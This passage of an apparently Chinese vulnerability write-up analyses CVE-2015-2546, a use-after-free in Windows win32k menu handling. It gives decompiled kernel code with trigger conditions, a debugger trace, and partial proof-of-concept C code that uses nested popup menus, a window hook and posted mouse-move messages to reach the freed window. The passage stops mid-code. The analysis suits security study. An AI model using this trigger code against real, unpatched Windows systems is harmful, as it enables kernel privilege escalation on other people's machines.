class="comment">; // eax</span></div><div class="line">  int <span class="built_in">v4</span>[<span class="number">3</span>]<span class="comment">; // [esp+4h] [ebp-Ch] BYREF</span></div><div class="line">  <span class="built_in">v1</span> = <span class="built_in">a1</span>-&gt;spwndNextPopup<span class="comment">;                      // 需要两个菜单</span></div><div class="line">  <span class="meta">if</span> ( !<span class="built_in">v1</span> )</div><div class="line">    return <span class="number">0</span><span class="comment">;</span></div><div class="line">  <span class="built_in">v4</span>[<span class="number">0</span>] = *(gptiCurrent + <span class="number">45</span>)<span class="comment">;</span></div><div class="line">  *(gptiCurrent + <span class="number">45</span>) = <span class="built_in">v4</span><span class="comment">;</span></div><div class="line">  <span class="built_in">v4</span>[<span class="number">1</span>] = <span class="built_in">v1</span><span class="comment">;</span></div><div class="line">  ++<span class="built_in">v1</span>-&gt;head.cLockObj<span class="comment">;</span></div><div class="line">  <span class="built_in">v2</span> = <span class="built_in">a1</span>-&gt;spwndNextPopup<span class="comment">;</span></div><div class="line">  <span class="meta">if</span> ( <span class="built_in">v2</span> != <span class="built_in">a1</span>-&gt;spwndActivePopup )             // 判断是否是活跃菜单</div><div class="line">    xxxSendMessage(<span class="built_in">v2</span>, <span class="number">0x1E4</span>, <span class="number">0</span>, <span class="number">0</span>)<span class="comment">;</span></div><div class="line">  xxxSendMessage(<span class="built_in">a1</span>-&gt;spwndNextPopup, <span class="number">0x1E5</span>, -<span class="number">1</span>, <span class="number">0</span>)<span class="comment">;</span></div><div class="line">  return <span class="number">1</span><span class="comment">;</span></div><div class="line">&#125;</div></pre></td></tr></table></figure></p><h2 id="0x01-Poc构建"><a href="#0x01-Poc构建" class="headerlink" title="0x01 Poc构建"></a>0x01 Poc构建</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;和CVE-2014-4113一样，触发CVE-2015-2546的<code>win32k!xxxMNMouseMove</code>函数也是在<code>win32k!xxxHandleMenuMessages</code>被调用。在代码88行调用<code>xxxMNMouseMove(v3, pMenuState, v7);</code>触发CVE-2015-2546,而在56行，调用<code>xxxSendMessage(v13, 0x1ED, tagPopupMenu, 0);</code>触发CVE-2014-4113。通过观察代码逻辑，在18行，如果v23不等于0的话，则不会调用<code>xxxMNMouseMove(v3, pMenuState, v7);</code>，所以网上追溯，当message为<code>0x200(WM_MOUSEMOVE)</code>的时候，就会执行<code>xxxMNMouseMove(v3, pMenuState, v7);</code>，所以只要主窗口发送<code>WM_MOUSEMOVE</code>消息的时候就会调用<code>xxxMNMouseMove</code>。<br><figure class="highlight smali"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div></pre></td><td class="code"><pre><div class="line"><span class="built_in"> if </span>( message &gt; 0x104 )                        // CVE-2014-4113 条件2</div><div class="line">  &#123;</div><div class="line">   <span class="built_in"> if </span>( message &lt;= 0x202 )                     // CVE-2014-4113 条件3</div><div class="line">    &#123;</div><div class="line">     <span class="built_in"> if </span>( message == 0x202 )</div><div class="line">       <span class="built_in"> goto </span><span class="class">LABEL_79;</span></div><div class="line">      v20 = message - 0x105;                    // CVE-2014-4113<span class="keyword"> :</span> message = 0xFC + 0x105 = 0x201(WM_LBUTTONDOWN)</div><div class="line">                                                // CVE-2015-2546<span class="keyword"> :</span> message = 0xFB + 0x105 = 0x200(WM_MOUSEMOVE)</div><div class="line">     <span class="built_in"> if </span>( v20 )                                // 条件2&lt;----CVE-2015-2546</div><div class="line">      &#123;</div><div class="line">        v21 = v20 - 1;                          // v20 = 0xFB + 0x1  = 0xFC</div><div class="line">       <span class="built_in"> if </span>( v21 )</div><div class="line">        &#123;</div><div class="line">          v22 = v21 - 0x12;                     // v21 = 0xE9 + 0x12 = 0xFB</div><div class="line">         <span class="built_in"> if </span>( !v22 )</div><div class="line">           <span class="built_in"> return </span>1;</div><div class="line">          v23 = v22 - 0xE8;                     // 0xE8 + 1 = 0xE9</div><div class="line">         <span class="built_in"> if </span>( v23 )                            // CVE-2015-2546 v23 == 0 否则不会触发</div><div class="line">          &#123;</div><div class="line">           <span class="built_in"> if </span>( v23 == 1 )</div><div class="line">            &#123;</div><div class="line">LABEL_13:</div><div class="line">              v12 = pMenuState;</div><div class="line">              pMenuState[4] = -1;</div><div class="line">              pMenuState[2] = v7;</div><div class="line">              pMenuState[3] = SHIWORD(v7);</div><div class="line">              v13 = xxxMNFindWindowFromPoint(v3, &amp;tagPopupMenu, v7);</div><div class="line">              pMenuStatea = IsMFMWFPWindow(v13);</div><div class="line">             <span class="built_in"> if </span>( pMenuStatea )</div><div class="line">              &#123;</div><div class="line">                v40 = *(gptiCurrent + 45);</div><div class="line">                *(gptiCurrent + 45) = &amp;v40;</div><div class="line">                v41 = v13;</div><div class="line">               <span class="built_in"> if </span>( v13 )</div><div class="line">                  ++*(v13 + 4);</div><div class="line">              &#125;</div><div class="line">             <span class="built_in"> if </span>( (v12[1] &amp; 0x400) != 0 )</div><div class="line">              &#123;</div><div class="line">                v12[9] = v12[2];</div><div class="line">                v12[10] = v12[3];</div><div class="line">                v12[12] = tagPopupMenu;</div><div class="line">                LockMFMWFPWindow(v12 + 0xB, v13);</div><div class="line">              &#125;</div><div class="line">             <span class="built_in"> if </span>( (v12[1] &amp; 0x500) != 0 )</div><div class="line">                v12[13] = ((v44 &amp; 2) != 0) + 1;</div><div class="line">             <span class="built_in"> if </span>( !v13 &amp;&amp; !tagPopupMenu )</div><div class="line">               <span class="built_in"> goto </span><span class="class">LABEL_22;</span></div><div class="line">             <span class="built_in"> if </span>( (*v3 &amp; 2) != 0 &amp;&amp; v13 == -5 )</div><div class="line">              &#123;</div><div class="line">                xxxMNSwitchToAlternateMenu(v3);</div><div class="line">                v13 = -1;</div><div class="line">              &#125;</div><div class="line">             <span class="built_in"> if </span>( v13 == -1 )</div><div class="line">                xxxMNButtonDown(v3, v12, tagPopupMenu, 1);</div><div class="line">              else                              // 可能为-5</div><div class="line">                xxxSendMessage(v13, 0x1ED, tagPopupMenu, 0);// &lt;------CVE-2014-4113</div><div class="line">             <span class="built_in"> if </span>( (v12[1] &amp; 0x100) == 0 )</div><div class="line">                xxxMNRemoveMessage(tagMsg-&gt;message, 516);</div><div class="line">LABEL_127:</div><div class="line">             <span class="built_in"> if </span>( !pMenuStatea )</div><div class="line">               <span class="built_in"> return </span>1;</div><div class="line">             <span class="built_in"> goto </span><span class="class">LABEL_142;</span></div><div class="line">            &#125;</div><div class="line">           <span class="built_in"> return </span>0;</div><div class="line">          &#125;</div><div class="line">LABEL_58:                                       // message  == 0x200(WM_MOUSEMOVE)</div><div class="line">          v24 = pMenuState[1];                  // 条件1&lt;------CVE-2015-2546</div><div class="line">         <span class="built_in"> if </span>( (v24 &amp; 0x400) != 0 &amp;&amp; (v24 &amp; 8) != 0 &amp;&amp; (v24 &amp; 0xC0) == 0 )</div><div class="line">          &#123;</div><div class="line">           <span class="built_in"> if </span>( pMenuState[11] )</div><div class="line">            &#123;</div><div class="line">              v38[0] = pMenuState[9];</div><div class="line">              v38[1] = pMenuState[10];</div><div class="line">              v38[2] = pMenuState[9];</div><div class="line">              v38[3] = pMenuState[10];</div><div class="line">              InflateRect(v38, *(gpsi + 1760), *(gpsi + 1764));</div><div class="line">             <span class="built_in"> if </span>( !PtInRect(v38, v7, SHIWORD(v7)) )</div><div class="line">              &#123;</div><div class="line">                v25 = GetMenuStateWindow(pMenuState);</div><div class="line">               <span class="built_in"> if </span>( v25 )</div><div class="line">                &#123;</div><div class="line">                  pMenuState[1] |= 0x80u;</div><div class="line">                  _PostMessage(v25, 500, 0, 0);</div><div class="line">                &#125;</div><div class="line">              &#125;</div><div class="line">            &#125;</div><div class="line">          &#125;</div><div class="line">          xxxMNMouseMove(v3, pMenuState, v7);   // &lt;----CVE-2015-2546</div><div class="line">         <span class="built_in"> return </span>1;</div><div class="line">        &#125;</div><div class="line">       <span class="built_in"> goto </span><span class="class">LABEL_27;</span></div><div class="line">      &#125;</div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<code>win32k!xxxMNMouseMove</code>作用是处理鼠标移动的消息,首先判断传入的PopupMenu对象是否是根弹出菜单对象，然后检查坐标是否发生移动，继而通过<code>xxxMNFindWindowFromPoint(ppopupmenu, &amp;cmdItem, *&amp;ptScreen_);</code>获取菜单窗口对象。如果是有效的菜单窗口对象，会判断该窗口对象是否被销毁，然后将获取到的窗口对象作为参数，传入<code>xxxSendMessage</code>发送<code>MN_SELECTITEM(0x1E5)</code>消息以选择菜单项，当返回的uFlag为<code>MF_POPUP</code>以及不为<code>MFS_GRAYED</code>，并且调用<code>xxxSendMessage</code>发送<code>MN_SETTIMERTOOPENHIERARCHY</code>消息不为0的时候，则调用<code>xxxMNHideNextHierarchy</code>函数以关闭弹出窗口的子菜单。<br><figure class="highlight lsl"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div></pre></td><td class="code"><pre><div class="line">void __stdcall xxxMNMouseMove(tagPOPUPMENU *cmdItem, tagMENUSTATE *pMenuState, POINTS ptScreen)</div><div class="line">&#123;</div><div class="line">  ppopupmenu = cmdItem;</div><div class="line">  if ( ppopupmenu == ppopupmenu-&gt;ppopupmenuRoot )<span class="comment">// tagPOPUPMENU 对象是否为当前的根弹出菜单对象</span></div><div class="line">  &#123;</div><div class="line">    ptScreen_ = ptScreen;</div><div class="line">    pMenuState_ = pMenuState;</div><div class="line">    if ( ptScreen.x != pMenuState-&gt;ptMouseLast.x || ptScreen.y != pMenuState-&gt;ptMouseLast.y ) <span class="comment">//检查坐标是否发生移动</span></div><div class="line">    &#123;</div><div class="line">      pMenuState-&gt;ptMouseLast.x = ptScreen.x;</div><div class="line">      pMenuState_-&gt;ptMouseLast.y = ptScreen_.y;</div><div class="line">      cmdHitArea = xxxMNFindWindowFromPoint(ppopupmenu, &amp;cmdItem, *&amp;ptScreen_);</div><div class="line">[...]</div><div class="line">      else                                      <span class="comment">// CVE-2015-2546条件3</span></div><div class="line">      &#123;</div><div class="line">        if ( cmdHitArea_1 == <span class="number">-1</span> )               <span class="comment">// if (cmdHitArea == MFMWFP_NOITEM) </span></div><div class="line">          goto LABEL_15;</div><div class="line">        if ( cmdHitArea_1 )                     <span class="comment">// 如果是菜单窗口对象的话</span></div><div class="line">                                                <span class="comment">// 条件2</span></div><div class="line">        &#123;</div><div class="line">          if ( IsWindowBeingDestroyed(cmdHitArea_1) )<span class="comment">// &lt;----CVE-2015-2546 返回为0即可</span></div><div class="line">            return;</div><div class="line">          v15 = *(gptiCurrent + <span class="number">45</span>);</div><div class="line">          *(gptiCurrent + <span class="number">45</span>) = &amp;v15;</div><div class="line">          v16 = cmdHitArea_1;</div><div class="line">          ++*(cmdHitArea_1 + <span class="number">4</span>);</div><div class="line">          v8 = *(pMenuState_ + <span class="number">1</span>);</div><div class="line">          popupmenu_ = *(cmdHitArea_1 + <span class="number">0xB0</span>);</div><div class="line">          if ( (v8 &amp; <span class="number">0x100</span>) != <span class="number">0</span> &amp;&amp; (v8 &amp; <span class="number">0x8000</span>) == <span class="number">0</span> &amp;&amp; (*popupmenu_ &amp; <span class="number">0x100000</span>) == <span class="number">0</span> )<span class="comment">// </span></div><div class="line">                                                <span class="comment">// if (pMenuState-&gt;fModelessMenu</span></div><div class="line">                                                <span class="comment">//     &amp;&amp; !pMenuState-&gt;fInDoDragDrop</span></div><div class="line">                                                <span class="comment">//     &amp;&amp; !ppopup-&gt;fTrackMouseEvent)</span></div><div class="line">          &#123;</div><div class="line">            v14 = *cmdHitArea_1;</div><div class="line">            v13 = <span class="number">2</span>;</div><div class="line">            TrackMouseEvent(&amp;v12);</div><div class="line">            *popupmenu_ |= <span class="number">0x100000</span>u;</div><div class="line">            xxxSendMessage(cmdHitArea_1, <span class="number">0x20</span>, *cmdHitArea_1, <span class="number">2</span>);</div><div class="line">          &#125;</div><div class="line">          v10 = xxxSendMessage(cmdHitArea_1, <span class="number">0x1E5</span>, cmdItem, <span class="number">0</span>);<span class="comment">// MN_SELECTITEM</span></div><div class="line">          if ( (v10 &amp; <span class="number">0x10</span>) != <span class="number">0</span> &amp;&amp; (v10 &amp; <span class="number">3</span>) == <span class="number">0</span> &amp;&amp; !xxxSendMessage(cmdHitArea_1, <span class="number">0x1F0</span>, <span class="number">0</span>, <span class="number">0</span>) )<span class="comment">// MN_SETTIMERTOOPENHIERARCHY</span></div><div class="line">            xxxMNHideNextHierarchy(popupmenu_); <span class="comment">// &lt;-----CVE-2015-5246 通过人为构造内存进行触发</span></div><div class="line">          goto LABEL_28;</div><div class="line">        &#125;</div><div class="line">      &#125;</div><div class="line">[...]</div><div class="line">    &#125;</div><div class="line">  &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<code>xxxMNHideNextHierarchy</code>函数逻辑就很简单了，只需要判断传入的ppopupmenu的弹出子菜单是否是活跃的弹出菜单之后，调用<code>xxxSendMessage</code>发送<code>MN_CLOSEHIERARCHY</code>消息关闭弹出菜单。然后接着发送<code>MN_SELECTITEM</code>消息继续选择菜单。<br><figure class="highlight zephir"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">BOOL</span> xxxMNHideNextHierarchy(</div><div class="line">    PPOPUPMENU ppopup)</div><div class="line">&#123;</div><div class="line">    <span class="keyword">if</span> (ppopup-&gt;spwndNextPopup != <span class="keyword">NULL</span>) &#123;</div><div class="line">[...]</div><div class="line">        <span class="keyword">if</span> (ppopup-&gt;spwndNextPopup != ppopup-&gt;spwndActivePopup)</div><div class="line">            xxxSendMessage(ppopup-&gt;spwndNextPopup, MN_CLOSEHIERARCHY, <span class="number">0</span>, <span class="number">0</span>L);</div><div class="line">        xxxSendMessage(ppopup-&gt;spwndNextPopup, MN_SELECTITEM, (WPARAM)<span class="number">-1</span>, <span class="number">0</span>L);</div><div class="line">        ThreadUnlock(&amp;tlpwndT);</div><div class="line">        <span class="keyword">return</span> <span class="keyword">TRUE</span>;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> <span class="keyword">FALSE</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;根据上述对于<code>win32k!xxxHandleMenuMessages</code>描述，CVE-2015-2546和CVE-2014-4113漏洞都产生于<code>xxxHandleMenuMessages</code>。其不同点在于，CVE-2014-4113的message为WM_LBUTTONDOWN(0x201),而CVE-2015-2546的message为WM_MOUSEMOVE(0x200)。我们都可以复用CVE-2014-4113的poc代码如下。需要改动的地方就是主窗口的WndProc函数。需要其发送WM_MOUSEMOVE(0x200)消息，以使执行流进入<code>xxxMNMouseMove</code><br><figure class="highlight lsl"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div></pre></td><td class="code"><pre><div class="line">BOOL poc_cve_2015_2546()</div><div class="line">&#123;</div><div class="line"><span class="comment">//创建一个主窗口</span></div><div class="line">HWND        hWnd;</div><div class="line">WNDCLASS    wc;</div><div class="line">memset(&amp;wc, <span class="number">0</span>, sizeof(wc));</div><div class="line">wc.lpfnWndProc = WndProc;</div><div class="line">wc.lpszClassName = <span class="string">"CVE-2015-2546"</span>;</div><div class="line">RegisterClassA(&amp;wc);</div><div class="line">hWnd = CreateWindowExA(<span class="number">0</span>, wc.lpszClassName, <span class="number">0</span>, <span class="number">0</span>, <span class="number">-1</span>, <span class="number">-1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</div><div class="line">if (hWnd == NULL)</div><div class="line">&#123;</div><div class="line">return <span class="literal">FALSE</span>;</div><div class="line">&#125;</div><div class="line">PTHRDESKHEAD thrdeskhead_wnd = pHmValidateHandle(hWnd, <span class="number">1</span>);</div><div class="line">PVOID tagWnd = thrdeskhead_wnd-&gt;pSelf;</div><div class="line">printf(<span class="string">"[+] tagWnd in Kernel Address : 0x%p<span class="subst">\n</span>"</span>, tagWnd);</div><div class="line"><span class="comment">//创建一个菜单，并插入</span></div><div class="line">HMENU MenuOne = CreatePopupMenu();</div><div class="line">MENUITEMINFOA MenuOneInfo = &#123; <span class="number">0</span> &#125;;</div><div class="line">MenuOneInfo.cbSize = sizeof(MENUITEMINFOA);</div><div class="line">MenuOneInfo.fMask = MIIM_STRING;</div><div class="line">BOOL insertMenuItem = InsertMenuItemA(MenuOne, <span class="number">0</span>, <span class="literal">TRUE</span>, &amp;MenuOneInfo);</div><div class="line"><span class="comment">//创建第二个菜单，并插入</span></div><div class="line">HMENU MenuTwo = CreatePopupMenu();</div><div class="line">MENUITEMINFOA MenuTwoInfo = &#123; <span class="number">0</span> &#125;;</div><div class="line">MenuTwoInfo.cbSize = sizeof(MENUITEMINFOA);</div><div class="line">MenuTwoInfo.fMask = (MIIM_STRING | MIIM_SUBMENU);</div><div class="line">MenuTwoInfo.hSubMenu = MenuOne;</div><div class="line">MenuTwoInfo.dwTypeData = (LPSTR)<span class="string">""</span>;</div><div class="line">MenuTwoInfo.cch = <span class="number">1</span>;</div><div class="line">insertMenuItem = InsertMenuItemA(MenuTwo, <span class="number">0</span>, <span class="literal">TRUE</span>, &amp;MenuTwoInfo);</div><div class="line"><span class="comment">//设置消息钩子</span></div><div class="line">HHOOK setWindowsHook = SetWindowsHookExA(WH_CALLWNDPROC, WndProcHook, NULL, GetCurrentThreadId());</div><div class="line"><span class="comment">//触发漏洞</span></div><div class="line">TrackPopupMenu(</div><div class="line">MenuTwo,</div><div class="line"><span class="number">0</span>,</div><div class="line"><span class="number">0</span>,</div><div class="line"><span class="number">0</span>,</div><div class="line"><span class="number">0</span>,</div><div class="line">hWnd,</div><div class="line">NULL);</div><div class="line">return <span class="literal">TRUE</span>;</div><div class="line">&#125;</div><div class="line">[........]</div><div class="line">LRESULT CALLBACK WndProc(HWND hWnd, UINT uMsg, WPARAM wParam, LPARAM lParam)</div><div class="line">&#123;</div><div class="line">if (uMsg == WM_ENTERIDLE)</div><div class="line">&#123;</div><div class="line">PostMessageA(hWnd, WM_KEYDOWN, VK_DOWN, <span class="number">0</span>);</div><div class="line">PostMessageA(hWnd, WM_KEYDOWN, VK_RIGHT, <span class="number">0</span>);</div><div class="line">PostMessageA(hWnd, WM_MOUSEMOVE, <span class="number">0</span>, <span class="number">1</span>);</div><div class="line"><span class="comment">//PostMessageA(hwnd, WM_LBUTTONDOWN, 0, 0); CVE-2014-4113</span></div><div class="line">&#125;</div><div class="line">return DefWindowProcA(hWnd, uMsg, wParam, lParam);</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><figure class="highlight lsl"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">kd&gt; kn</div><div class="line"> # ChildEBP RetAddr      </div><div class="line"><span class="number">00</span> <span class="number">968</span>d7b90 <span class="number">95</span>ab7db0     win32k!xxxMNMouseMove</div><div class="line"><span class="number">01</span> <span class="number">968</span>d7bec <span class="number">95</span>aafa64     win32k!xxxHandleMenuMessages+<span class="number">0x2ed</span></div><div class="line"><span class="number">02</span> <span class="number">968</span>d7c38 <span class="number">95</span>abf71b     win32k!xxxMNLoop+<span class="number">0x2c6</span></div></pre></td></tr></table></figure><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在<code>xxxMNMouseMove</code>中，要触发漏洞，需要有4个条件,根据调试，第一个条件自动满足。</p><ul><li>1.tagPOPUPMENU 对象是否为当前的根弹出菜单对象</li><li>2.通过<code>xxxMNFindWindowFromPoint</code>获取到的窗口对象的有效性，即不能为-1，也不能为-5，且不能被销毁。</li><li>3.利用<code>xxxSendMessage</code>发送<code>MN_SELECTITEM</code>消息之后，返回的标志是<code>MF_POPUP</code>(弹出菜单)，以及不为<code>MFS_GRAYED</code>(禁用状态)</li><li>4.利用<code>xxxSendMessage</code>发送<code>MN_SETTIMERTOOPENHIERARCHY</code>消息返回值为0</li></ul><figure class="highlight hsp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line"><span class="comment">/*</span></div><div class="line"><span class="comment"> * Select the item.</span></div><div class="line"><span class="comment"> */</span></div><div class="line">uFlags = (UINT)xxxSendMessage(pwnd, MN_SELECTITEM, (<span class="keyword">WPARAM</span>)cmdItem, <span class="number">0</span>L)<span class="comment">;</span></div><div class="line"><span class="keyword">if</span> ((uFlags &amp; MF_POPUP) &amp;&amp; !(uFlags &amp; MFS_GRAYED)) &#123;</div><div class="line">   <span class="comment">/*</span></div><div class="line"><span class="comment">    * User moved back onto an item with a hierarchy. Hide the</span></div><div class="line"><span class="comment">    * the dropped popup.</span></div><div class="line"><span class="comment">    */</span></div><div class="line">   <span class="keyword">if</span> (!xxxSendMessage(pwnd, MN_SETTIMERTOOPENHIERARCHY, <span class="number">0</span>, <span class="number">0</span>L)) &#123;</div><div class="line">        xxxMNHideNextHierarchy(ppopup)<span class="comment">;</span></div><div class="line">   &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;重点分析一下<code>xxxMNMouseMove</code>函数，CVE-2015-2546是一个UAF漏洞，漏洞本质如上所述，在执行<code>xxxSendMessage</code>执行流返回用户侧代码，销毁窗口对象pwnd，然后xxxMNHideNextHierarchy没有经过检查便使用了已经销毁的窗口对象pwnd。但是在此之前，调用<code>xxxMNFindWindowFromPoint</code>是要确保得到的对象有效性。所以，只能在发送<code>MN_SETTIMERTOOPENHIERARCHY</code>的时机去销毁。<br><figure class="highlight cs"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div></pre></td><td class="code"><pre><div class="line"><span class="function">VOID <span class="title">xxxMNMouseMove</span>(<span class="params"></span></span></div><div class="line"><span class="function"><span class="params">    PPOPUPMENU ppopup,</span></span></div><div class="line"><span class="function"><span class="params">    PMENUSTATE pMenuState,</span></span></div><div class="line"><span class="function"><span class="params">    POINTS ptScreen</span>)</span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">[<span class="meta">...</span>]</div><div class="line">    <span class="keyword">if</span> (!IsRootPopupMenu(ppopup)) &#123;</div><div class="line">        RIPMSG0(RIP_ERROR,</div><div class="line">            <span class="string">"MenuMouseMoveHandler() called for a non top most menu"</span>);</div><div class="line">        <span class="keyword">return</span>;</div><div class="line">    &#125;</div><div class="line">[<span class="meta">...</span>]</div><div class="line">    cmdHitArea = xxxMNFindWindowFromPoint(ppopup, &amp;cmdItem, ptScreen);</div><div class="line">[<span class="meta">...</span>]</div><div class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (cmdHitArea != <span class="number">0</span>) &#123;</div><div class="line">[<span class="meta">...</span>]</div><div class="line">pwnd = (PWND)(cmdHitArea);</div><div class="line">        ppopup = ((PMENUWND)pwnd)-&gt;ppopupmenu;</div><div class="line">[<span class="meta">...</span>]</div><div class="line">        uFlags = (UINT)xxxSendMessage(pwnd, MN_SELECTITEM, (WPARAM)cmdItem, <span class="number">0</span>L);</div><div class="line">        <span class="keyword">if</span> ((uFlags &amp; MF_POPUP) &amp;&amp; !(uFlags &amp; MFS_GRAYED)) </div><div class="line">&#123;</div><div class="line">           <span class="keyword">if</span> (!xxxSendMessage(pwnd, MN_SETTIMERTOOPENHIERARCHY, <span class="number">0</span>, <span class="number">0</span>L)) </div><div class="line">&#123;</div><div class="line">                xxxMNHideNextHierarchy(ppopup);</div><div class="line">           &#125;</div><div class="line">        &#125;</div><div class="line">    &#125; </div><div class="line">[<span class="meta">...</span>]</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;所以，现在劫持的回调函数中，需要处理三种消息。编写的消息处理函数如下。<br><figure class="highlight hsp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div></pre></td><td class="code"><pre><div class="line">[+] MN_FINDMENUWINDOWFROMPOINT:只需要返回一个有效的窗口对象即可。</div><div class="line">[+] MN_SELECTITEM:只需要返回<span class="number">0</span>x3或者<span class="number">0</span>x10的标志即可。</div><div class="line">[+] MN_SETTIMERTOOPENHIERARCHY:首先，需要返回<span class="number">0</span>，然后还要销毁上面那个有效的窗口对象，以保证漏洞能被利用</div><div class="line"><span class="comment">//////////</span></div><div class="line">LRESULT CALLBACK NewWndProc(<span class="keyword">HWND</span> <span class="keyword">hWnd</span>, UINT uMsg, <span class="keyword">WPARAM</span> <span class="keyword">wParam</span>, <span class="keyword">LPARAM</span> <span class="keyword">lParam</span>)<span class="comment">//back default tagWnd will change!!!</span></div><div 